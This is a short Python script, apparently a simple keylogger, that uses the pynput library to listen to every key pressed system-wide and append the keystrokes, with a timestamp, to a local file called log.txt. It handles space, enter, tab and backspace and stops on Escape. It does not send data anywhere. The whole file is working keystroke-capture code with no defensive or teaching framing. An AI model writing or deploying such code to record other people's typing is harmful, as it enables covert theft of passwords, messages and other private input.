import time
from pynput.keyboard import Listener

getTime = time.asctime()  # This is to

with open("log.txt", 'a') as f:
    f.write(f"\n\n{getTime}\n")


def writeToFile(key):
    letter = str(key).replace("'", "") # replace ' with blank

    if "Key.space" in letter:
        letter = ' '
        writeKey(letter)

    elif "enter" in letter:
        letter = "\n"
        writeKey(letter)

    elif "tab" in letter:
        letter = "\t"
        writeKey(letter)

    elif "Key" not in letter:
        writeKey(letter)

    elif letter == "Key.backspace":
        with open("log.txt", "r") as f: # open the file as read
            f_content = f.read()        # Store the file content in f_content
            f_content = f_content[:-1]  # From the f_content, remove the last character for f_content

        with open("log.txt","w") as f:  # Open the file in write mood, this is to overwrite what ever you have in the file
            f.write(f_content)          # Remember, you have removed the last character.
                                        # Paste the file content in the file and store

    elif letter == "Key.esc":  # When key is esc, quit the program
        return False


def writeKey(letter):
    with open("log.txt", "a") as f:
        f.write(letter)


with Listener(on_press=writeToFile) as listen:
    listen.join()
